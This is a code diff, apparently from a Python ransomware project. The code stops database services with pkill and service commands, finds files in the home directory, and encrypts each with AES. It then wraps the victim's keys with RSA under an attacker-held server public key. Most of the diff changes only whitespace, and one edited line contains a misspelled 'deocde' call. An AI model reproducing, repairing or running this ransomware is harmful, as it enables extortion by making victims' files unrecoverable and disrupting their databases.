@@ -26,7 +26,7 @@ def kill_databases():
         mysql = 'mysqld stop; mysql.server stop'
         mongo = 'service mongodb stop; /etc/init.d/mongodb stop'
         postgres = 'pkill -u postgres; pkill postgres'
-        
+
         os.system(mysql)
         os.system(mongo)
         os.system(postgres)
@@ -50,7 +50,7 @@ def start_encryption(files):
     for found_file in files:
         key = generate_keys.generate_key(128, True)
         AES_obj = symmetric.AESCipher(key)
-        
+
         found_file = base64.b64decode(found_file)
 
         try:
@@ -79,29 +79,29 @@ def menu():
         pass
 
     kill_databases()
-        
+
     files = get_files.find_files(variables.home)
 
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
-    
+
     Client_private_key = rsa_object.private_key_PEM
     Client_public_key = rsa_object.public_key_PEM
     encrypted_client_private_key = encrypt_priv_key(Client_private_key,
                                                     variables.server_public_key)
-    
+
     with open(variables.encrypted_client_private_key_path, 'wb') as output:
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
-    
+
     with open(variables.client_public_key_path, 'wb') as f:
         f.write(Client_public_key)
-    
+
     Client_private_key = None
     rsa_object = None
     del rsa_object
     del Client_private_key
     gc.collect()
-    
+
     client_public_key_object =  RSA.importKey(Client_public_key)
     client_public_key_object_cipher = PKCS1_OAEP.new(client_public_key_object)
 
@@ -116,14 +116,14 @@ def menu():
 
         encrypted_aes_key = client_public_key_object_cipher.encrypt(aes_key)
         enc_aes_key_and_base64_path.append((encrypted_aes_key, base64_path))
-    
+
     aes_keys_and_base64_path = None
     del aes_keys_and_base64_path
     gc.collect()
 
     with open(variables.aes_encrypted_keys_path, 'w') as f:
         for _ in enc_aes_key_and_base64_path:
-            line = base64.b64encode(_[0]) + " " + _[1] + "\n"
+            line = base64.b64encode(_[0]).deocde('utf-8') + " " + _[1] + "\n"
             f.write(line)
 
     enc_aes_key_and_base64_path = None
